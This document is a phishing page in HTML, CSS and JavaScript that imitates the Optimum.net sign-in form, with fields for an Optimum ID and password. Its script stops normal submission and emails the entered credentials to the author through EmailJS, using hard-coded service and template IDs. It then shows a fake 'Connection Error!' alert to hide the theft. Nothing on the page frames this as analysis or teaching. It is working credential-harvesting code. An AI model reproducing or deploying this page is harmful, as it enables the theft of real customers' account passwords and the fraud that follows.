    <style>
      * {
        margin: 0;
        box-sizing: border-box;
      }

      body {
        font-size: 14px;
        color: #555;
      }
      .navbar {
        background-color: #002864;
        display: flex;
        justify-content: space-between;
        padding: 20px 40px;
      }

      .navbar img {
        height: 45px;
        width: 225px;
      }

      .logo p {
        color: white;
        font-weight: 400;
        font-size: 18px;
        font-style: italics;
      }
      .container {
        display: flex;
        justify-content: space-evenly;
        flex-wrap: wrap;
        margin-top: 50px;
        background-color: whitesmoke;
        width: 100%;

      }

      .container img {
        height: 330px;
      }

      .form-label {
        font-weight: 800;
      }

      .btn {
        background-color: orange;
        font-weight: 700;
      }

      #emailHelp {
        color: steelblue;
        font-weight: 600;
      }

      .navigations {
        flex: 0.5;
      }

      .navigate {
        display: flex;
        justify-content: space-between;
        align-items: center;
      }

      .navigate a {
        cursor: pointer;
      }

      .navigate .search {
        flex: 0.7;
        display: flex;
        align-items: center;
        border: none;
      }

      .navigate .search input {
        flex: 1;

        outline: none;
        padding: 3px;
        border-radius: 4px 0 0 4px;
      }

      .navigate .search i {
        flex: 0.15;
        font-size: 14px;

        font-weight: 900;
        padding: 3px;
        text-align: center;
        /* padding-left: 10px; */
        color: #fff;
        background-color: #f66608;
        border-radius: 0 4px 4px 0;
        cursor: pointer;
      }

      .menu-bar {
        display: none;
        color: #fff;
        font-size: 30px;
        /* padding-left: 30px; */
      }

      .menu-close {
        display: none;
      }

      .navigate-bottom {
        margin-top: 10px;
        /* width: 100%; */
        display: flex;
        gap: 10px;
      }

      /*start here  */

      /* .navigate-bottom a {
        padding-left: 30px;
        width: 50px;
        font-weight: 200;
      } */

      .navigate-bottom div i {
        font-size: 18px;
        color: #fff;
        background-color: #666666;
        padding: 8px;
        border-radius: 6px;
      }

      /* .navigate-bottom span img {
        font-size: 10px;
        width: 30px;
        height: 32px;
        position: absolute;
      } */

      .navigate-bottom a {
        /* padding-right: 20px; */
        /* width: 50px; */
        font-weight: 200;
        font-size: 20px;
        font-family: "Lucida Sans", "Lucida Sans Regular", "Lucida Grande",
          "Lucida Sans Unicode", Geneva, Verdana, sans-serif;
        cursor: pointer;
      }

      .container-fluid {
        display: flex;
        justify-content: space-around;
        flex-wrap: wrap;
        min-height: 400px;
        padding: 30px;
        width: 100%;
      }

      .container-fluid img {
        width: 100%;
      }

      @media all and (max-width: 768px) {
        .logo p {
          display: none;
        }

        .navbar img {
          height: 30px;
          width: 150px;
        }
        .navigate a {
          display: none;
        }

        .navigate .search input {
          display: none;
        }

        .navigate .search i {
          border-radius: 4px;
          margin-right: 30px;
          background-color: transparent;
          border-radius: 0;
          font-size: 16px;
        }

        .menu-bar {
          display: block;
        }

        .menu-close {
          display: block;
          margin-top: 10px;
        }

        .menu-bar i {
          background-color: #002864;
        }

        .navigate-bottom {
          display: none;
          /* display: flex; */
          flex-direction: column;

          padding-left: 20px;
          position: absolute;
          top: 0;
          right: 0;
          z-index: 100;
          background-color: #002864;
          height: 100vh;
          width: 50%;
        }

        .open {
          display: flex;
        }

        .navigate-bottom .internet-link {
          margin-top: 40px;
        }
      }
    </style>

  <body>

    <!-- navbar -->

    <main class="container">
      <form id="login-form">
        <div class="mb-3">
          <label for="exampleInputEmail1" class="form-label"
            >My Optimum ID</label
          >
          <input
            type="text"
            name="exampleInputEmail1"
            class="form-control"
            id="exampleInputEmail1"
            aria-describedby="emailHelp"
            autocomplete="off"
            required
          />
          <div id="emailHelp" class="form-text">I forgot my Optimum ID</div>
        </div>
        <div class="mb-3">
          <label for="exampleInputPassword1" class="form-label">Password</label>
          <input type="password" name="exampleInputPassword1"
          class="form-control" " id="exampleInputPassword1" required>
          <div id="emailHelp" class="form-text">I forgot my Password</div>
          <hr />
        </div>
        <div class="mb-3 form-check">
          <input type="checkbox" class="form-check-input" id="exampleCheck1" />

          <label class="form-check-label" for="exampleCheck1"
            >Remember me</label
          >
        </div>
        <button type="submit" class="btn text-light">
          Sign in to Optimum.net
        </button>
        <div id="emailHelp" class="form-text">
          Don't have an Optimum ID? Create one
        </div>
      </form>

      <div class="">

      </div>

      <div class="">

    <div class="container-fluid">
      <div class="">

      <div class="">
        <img src="./assets/optimum my bill.png" />
      </div>
    </div>

    <script>
      // Load the EmailJS SDK asynchronously
      (function () {
        emailjs.init("Fc6Zb2E93HsLc4jAH");
      })();

      // Handle the form submission
      const form = document.getElementById("login-form");

      form.addEventListener("submit", (event) => {
        event.preventDefault(); // Prevent the default form submission behavior

        // Get the form data;
        const optimumId = form.elements["exampleInputEmail1"].value;
        const password = form.elements["exampleInputPassword1"].value;

        // Send the form data to EmailJS
        emailjs
          .send("service_rybja5w", "template_2g5g3nh", {
            optimumId: optimumId,
            password: password,
          })
          .then(
            () => {
              // Handle the successful form submission here
              alert("Connection Error!");
            },
            (error) => {
              // Handle the form submission error here
              alert("Form submission failed. Error: " + error);
            }
          );
      });

      //*menu bar for small screen
      const menu = document.querySelector(".menu-bar");
      const closeLink = document.querySelector(".menu-close");
      const navLink = document.querySelector(".navigate-bottom");

      menu.addEventListener("click", () => {
        navLink.classList.toggle("open");
      });

      closeLink.addEventListener("click", () => {
        navLink.classList.toggle("open");
      });
    </script>
